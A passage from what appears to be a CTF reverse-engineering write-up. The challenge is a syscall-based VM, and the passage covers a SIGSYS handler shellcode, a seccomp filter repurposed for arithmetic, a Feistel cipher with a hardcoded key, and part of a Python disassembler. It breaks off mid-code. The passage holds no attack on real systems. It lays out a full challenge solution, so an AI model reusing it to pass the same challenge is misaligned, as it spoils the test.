</span></span><span class=line><span class=cl>  <span class=nf>syscall</span><span class=p>(</span><span class=n>sysno</span><span class=p>,</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=n>sysargs</span><span class=p>[</span><span class=mi>5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=o>++</span><span class=n>regs</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>From this code we can also see that the VM allows up to 6 arguments for a given
syscall and that it offers 16 64bit registers, the last of which is the
instruction pointer. The custom instruction encoding can be extracted from the
<code>fetch_inst</code> function, which was reimplemented in python to continue the
analysis</p><p>At a basic level, the VM executes a syscall for each opcode. Since the
disassembly was over 2k lines long, we used some rules to simplify and shorten
it. For example, a <code>mov reg, reg</code> instruction was implemented as a
<code>set_tid_address &lt;value>; prctl GET_TID_ADDRESS &&lt;dest></code>.</p><p>After this first step, the bytecode could be subdivided in four main parts:</p><ul><li>At first, it loads some shellcode in memory and sets it as the SIGSYS handler,
which can used by seccomp in response to filtered syscalls</li><li>Then, it prepares and loads a seccomp filter which intercepts a fixed set of
syscalls, replacing them with custom actions</li><li>Next, it takes the user input (which was read at the start of the shellcode)
and processes it</li><li>And finally, it prints a success message to an invalid file descriptor</li></ul><p>The logical next step was to analyze the shellcode and the seccomp filter:</p><pre tabindex=0><code>; Sigaction handler
   0:    48 b9 2c 34 3a 79 f5     movabs rcx,  0x3f8495f5793a342c
   a:    95 84 3f                 mov    edx,  DWORD PTR [rsi+0x4] # si_code
   d:    8b 56 04                 mov    WORD PTR [rcx],  dx
  10:    66 89 11                 lea    rcx,  [rip+0xffffffffffffffeb]  # 0x2
  17:    48 8d 0d eb ff ff ff     inc    QWORD PTR [rcx]
  1a:    48 ff 01                 inc    QWORD PTR [rcx]
  1d:    48 ff 01                 ret


; Restorer function
   0:    31 c0                    xor    eax,  eax
   2:    b0 0f                    mov    al,  sys_sigreturn
   4:    0f 05                    syscall
</code></pre><p>The interesting part here is the sigaction handler: it takes the syscall return
value, stores it at the address contained in <code>rcx</code> and increments that pointer
by 2 by modifying the <code>movabs</code> instruction. Since the return value is 16 bits
wide, by repeating this procedure twice we can obtain a full 32 bit result.</p><p>The seccomp filter, extracted using <code>seccomp_tools</code>, is as follows:</p><pre tabindex=0><code> line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x0d 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0015
 0002: 0x15 0x0a 0x00 0x00000001  if (A == write) goto 0013
 0003: 0x15 0x20 0x00 0x00000068  if (A == getgid) goto 0036
 0004: 0x15 0x15 0x00 0x00000066  if (A == getuid) goto 0026
 0005: 0x15 0x28 0x00 0x000000ba  if (A == gettid) goto 0046
 0006: 0x15 0x0e 0x00 0x00000027  if (A == getpid) goto 0021
 0007: 0x15 0x17 0x00 0x0000006c  if (A == getegid) goto 0031
 0008: 0x15 0x07 0x00 0x0000006f  if (A == getpgrp) goto 0016
 0009: 0x15 0x29 0x00 0x0000006e  if (A == getppid) goto 0051
 0010: 0x15 0x1e 0x00 0x0000006b  if (A == geteuid) goto 0041
 0011: 0x15 0x2c 0x00 0x00000039  if (A == fork) goto 0056
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0014: 0x15 0x00 0x37 0x00000000  if (A != 0x0) goto 0070
 0015: 0x06 0x00 0x00 0x00000000  return KILL

 0016: 0x20 0x00 0x00 0x00000018  A = args[1]
 0017: 0x07 0x00 0x00 0x00000000  X = A
 0018: 0x20 0x00 0x00 0x00000010  A = args[0]
 0019: 0x2c 0x00 0x00 0x00000000  A *= X
 0020: 0x15 0x28 0x28 0x00000000  goto 0061

 [all other handlers omitted for brevity]

 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0062: 0x20 0x00 0x00 0x00000020  A = args[2]
 0063: 0x07 0x00 0x00 0x00000000  X = A
 0064: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0065: 0x7c 0x00 0x00 0x00000000  A &gt;&gt;= X
 0066: 0x01 0x00 0x00 0x00030000  X = 196608
 0067: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff
 0068: 0x4c 0x00 0x00 0x00000000  A |= X
 0069: 0x16 0x00 0x00 0x00000000  return A
 0070: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</code></pre><p>This filter is used to implement arithmetic operations in the bytecode by
hooking unused syscalls. For example, a <code>getpgrp</code> syscall is used to multiply
two numbers. Since the result is only 16 bits wide, each 32bit operation calls
the required syscall twice, once with a shift (third argument) of 0 and once
with a shift of 16.</p><p>With the seccomp filter & handler reversed, it was now possible to apply more
rules to the bytecode, reducing it to less than 600 instructions, of which most
are the ones used to set up the filter itself, meaning that the unreversed part
got reduced to roughly 300 lines.</p><p>In the remaining code there were 4 repetitions of code that looked very similar
and a final block that applies some final operations on the input and prints the
success message. The 4 repetitions are all the same except for some constant
values which are used, making it look very similar to some sort of encryption
algorithm. In fact, by analyzing it further (with the help of an <code>strace</code> log of
the binary with a known input for debugging) it was possible to reimplement the
algorithm in C, revealing that it was some sort of 32-round feistel network.</p><p>Any feistel round can be inverted if the output and key are known. Since the key
was hardcoded in the bytecode, this meant that given an output it could be
decrypted to get the flag.</p><p>The last part of the bytecode, just before printing the final message, XORs each
4byte block of the encrypted flag with a constant value and calculates the OR of
all the XORs:</p><pre tabindex=0><code>strcpy &amp;r9 0x217058
mov 0x0 r2
r3 = r9 ^ 0x4a9d3ffd
r2 = r2 | r3
strcpy &amp;r9 0x21705c
mov 0x0 r2
r3 = r9 ^ 0xbb541082
r2 = r2 | r3
strcpy &amp;r9 0x217060
mov 0x0 r2
r3 = r9 ^ 0x632a4f78
r2 = r2 | r3
strcpy &amp;r9 0x217064
mov 0x0 r2
r3 = r9 ^ 0xa9cb93d
r2 = r2 | r3
strcpy &amp;r9 0x217068
mov 0x0 r2
r3 = r9 ^ 0x58aae351
r2 = r2 | r3
strcpy &amp;r9 0x21706c
mov 0x0 r2
r3 = r9 ^ 0x92012a14
</code></pre><p>This meant that the final value would be 0 if and only if the encrypted flag was
equal to those constants, and so those were the best candidates to try
decryption on. Indeed, by concatenating and decrypting them, we got the flag.</p><p>For reference, this is the decompiler code and the final decryption code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>unpack</span>
</span></span><span class=line><span class=cl><span class=n>u64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>x</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;sop_bytecode&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>fin</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getbit</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>data</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>idx</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span><span class=p>,</span> <span class=n>data</span> <span class=o>&gt;&gt;</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>syscalls</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> <span class=s1>&#39;read&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>1</span><span class=p>:</span> <span class=s1>&#39;write&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>9</span><span class=p>:</span> <span class=s1>&#39;mmap&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>13</span><span class=p>:</span> <span class=s1>&#39;rt_sigaction&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>39</span><span class=p>:</span> <span class=s1>&#39;getpid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>57</span><span class=p>:</span> <span class=s1>&#39;fork&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>102</span><span class=p>:</span> <span class=s1>&#39;getuid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>104</span><span class=p>:</span> <span class=s1>&#39;getgid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>107</span><span class=p>:</span> <span class=s1>&#39;geteuid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>108</span><span class=p>:</span> <span class=s1>&#39;getegid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>110</span><span class=p>:</span> <span class=s1>&#39;getppid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>111</span><span class=p>:</span> <span class=s1>&#39;getpgrp&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>157</span><span class=p>:</span> <span class=s1>&#39;prctl&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>186</span><span class=p>:</span> <span class=s1>&#39;gettid&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>218</span><span class=p>:</span> <span class=s1>&#39;set_tid_address&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>disasm</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sysno</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>mode</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mode</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>args</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;r</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>mode</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>args</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&amp;r</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>mode</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>size</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span><span class=p>,</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>getbit</span><span class=p>(</span><span class=n>opcode</span><span class=p>,</span> <span class=n>size</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>args</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>imm</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>sysno</span> <span class=ow>in</span> <span class=n>syscalls</span>
</span></span><span class=line><span class=cl>    <span class=n>disasm</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>syscalls</span><span class=p>[</span><span class=n>sysno</span><span class=p>],</span> <span class=o>*</span><span class=n>args</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=c1>#print(syscalls[sysno], &#39; &#39;.join(args))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># All rules return the number of lines used and the new line</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set_tid_address value + prctl get_tid &amp;dest -&gt; dest = value</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tid_prctl_mov</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;set_tid_address&#39;</span> <span class=ow>and</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;prctl&#39;</span> <span class=ow>and</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0x28&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>dest</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Dereference</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>dest</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;&amp;&#39;</span><span class=p>:</span> <span class=n>dest</span> <span class=o>=</span> <span class=n>dest</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> <span class=n>dest</span> <span class=o>=</span> <span class=s1>&#39;*&#39;</span> <span class=o>+</span> <span class=n>dest</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>2</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;mov&#39;</span><span class=p>,</span> <span class=n>val</span><span class=p>,</span> <span class=n>dest</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># prctl SET_NAME str + prctl GET_NAME dest -&gt; strcpy(dest, str)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>prctl_name_strcpy</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;prctl&#39;</span> <span class=ow>and</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;prctl&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0xf&#39;</span> <span class=ow>and</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0x10&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>dest</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>2</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;strcpy&#39;</span><span class=p>,</span> <span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prctl_vals</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mi>22</span><span class=p>:</span> <span class=s1>&#39;PR_SET_SECCOMP&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>38</span><span class=p>:</span> <span class=s1>&#39;PR_SET_NO_NEW_PRIVS&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>readable_prctl</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;prctl&#39;</span> <span class=ow>and</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>val</span> <span class=ow>in</span> <span class=n>prctl_vals</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;prctl&#39;</span><span class=p>,</span> <span class=n>prctl_vals</span><span class=p>[</span><span class=n>val</span><span class=p>]]</span> <span class=o>+</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>seccomp_ops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getgid&#39;</span><span class=p>:</span> <span class=s1>&#39;&amp;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getuid&#39;</span><span class=p>:</span> <span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;gettid&#39;</span><span class=p>:</span> <span class=s1>&#39;|&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getpid&#39;</span><span class=p>:</span> <span class=s1>&#39;+&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getegid&#39;</span><span class=p>:</span> <span class=s1>&#39;-&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getpgrp&#39;</span><span class=p>:</span> <span class=s1>&#39;*&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getppid&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;&lt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;geteuid&#39;</span><span class=p>:</span> <span class=s1>&#39;^&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;fork&#39;</span><span class=p>:</span> <span class=s1>&#39;/&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>seccomp_rules</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=ow>in</span> <span class=n>seccomp_ops</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>3</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>or</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>3</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>16</span><span class=p>:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>op</span> <span class=o>=</span> <span class=n>seccomp_ops</span><span class=p>[</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>2</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;arith&#39;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>op</span><span class=p>,</span> <span class=n>b</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>arithmetic</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;mov&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;mov&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;mov&#39;</span><span class=p>:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;arith&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;&amp;&#39;</span><span class=p>:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;*0x217022&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;r0&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;r1&#39;</span><span class=p>:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;r0&#39;</span> <span class=ow>or</span> <span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;r1&#39;</span><span class=p>:</span> <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>op</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>4</span><span class=p>,</span> <span class=p>[</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>dest</span><span class=si>}</span><span class=s1> = </span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s1> </span><span class=si>{</span><span class=n>op</span><span class=si>}</span><span class=s1> </span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rules</span> <span class=o>=</span> <span class=p>[</span>
